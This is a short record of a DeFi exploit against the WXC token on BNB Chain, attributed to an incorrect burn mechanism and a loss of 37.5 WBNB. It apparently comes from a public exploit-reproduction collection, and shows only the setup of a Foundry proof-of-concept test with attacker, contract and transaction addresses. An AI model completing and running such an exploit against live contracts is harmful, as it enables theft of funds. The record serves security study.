# [?] WXC - Incorrect token burn mechanism

## Summary
Severity: Unknown
Chain: BNB Chain
Component: WXC_Token
Published: 2025-08-11
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/WXC_Token_exp.sol
Type: defi-exploit-poc

## Details
Lost: 37.5 WBNB

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../basetest.sol";
import "../interface.sol";
// @KeyInfo - Total Lost : 37.5 WBNB
// Attacker : 0x476954c752a6ee04b68382c97f7560040eda7309
// Attack Contract : 0x798465b25b68206370d99f541e11eea43288d297
// Vulnerable Contract : 0x8087720eeea59f9f04787065447d52150c09643e
// Attack Tx : https://bscscan.com/tx/0x1397bc7f0d284f8e2e30d0a9edd0db1f3eb0dd284c75e30d226b02bf09ad068f

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x8087720eeea59f9f04787065447d52150c09643e#code

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1954774967481962832
// Twitter Guy : https://x.com/TenArmorAlert/status/1954774967481962832
// Hacking God : N/A

contract WXC is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 57177438 - 1;
     uint256 flashAmount = 49150000000000000000;
    //contracts
    IPancakePair Cake_LP = IPancakePair(0xdA5C7eA4458Ee9c5484fA00F2B8c933393BAC965);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 WXC  = IERC20(0x8087720EeeA59F9F04787065447D52150c09643E);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    I0x8f73_ERC1967Proxy ercproxy = I0x8f73_ERC1967Proxy(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(WBNB);
    }

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/WXC_Token_exp.sol_
